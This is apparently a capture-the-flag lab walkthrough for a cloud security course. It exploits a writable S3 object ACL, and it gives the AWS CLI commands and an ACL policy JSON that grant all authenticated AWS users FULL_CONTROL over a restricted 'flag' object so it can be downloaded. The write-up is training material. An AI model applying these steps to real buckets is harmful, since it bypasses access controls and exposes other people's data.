# Writable Object ACL

Check S3 buckets. `aws s3api list-buckets --profile PTAcademyJllerena | jq`
![image](https://user-images.githubusercontent.com/46797181/227685904-16c4cb71-95eb-4221-ad12-87bff5ea7361.png)

Check objects present in S3 bucket and try downloading them, nothice that a forbidden message is obtained 
```
aws s3api list-objects --bucket s3-secret-115329293798 --profile PTAcademyJllerena
aws s3 cp s3://s3-secret-115329293798/flag ./ --profile PTAcademyJllerena
```
![image](https://user-images.githubusercontent.com/46797181/227686648-62c1192c-2cca-4b92-8c3d-875c35210e2e.png)

Check object ACL. `aws s3api get-object-acl --bucket s3-secret-115329293798 --key flag --profile PTAcademyJllerena | jq`

![image](https://user-images.githubusercontent.com/46797181/227687769-8d3626e4-8144-4746-af13-dd5b728f66e3.png)

Modify the output from above image and create a file with the following content

```
{    
  "Owner": {
    "DisplayName": "awsplayground+1663603152528",
    "ID": "b590f441d42fed7dc85ada8f975ed44187f82aa9b57c6bd3675b7097e6cee4b8"
  }, 
  "Grants": [
    {
      "Grantee": {
        "Type": "Group",
        "URI": "http://acs.amazonaws.com/groups/global/AuthenticatedUsers"
      },
      "Permission": "FULL_CONTROL"
    } 
  ]  
} 
```

Update the new ACL for the object and try downloading the object to verify that there are no longer restrictions. 

```
aws s3api put-object-acl --bucket s3-secret-115329293798 --key flag --access-control-policy file://policy.json --profile PTAcademyJllerena
aws s3 cp s3://s3-secret-115329293798/flag ./ --profile PTAcademyJllerena
cat flag

```
![image](https://user-images.githubusercontent.com/46797181/227689004-4127546d-2307-43a0-a324-07ccef36dbd9.png)

EXERCISE COMPLETED !!





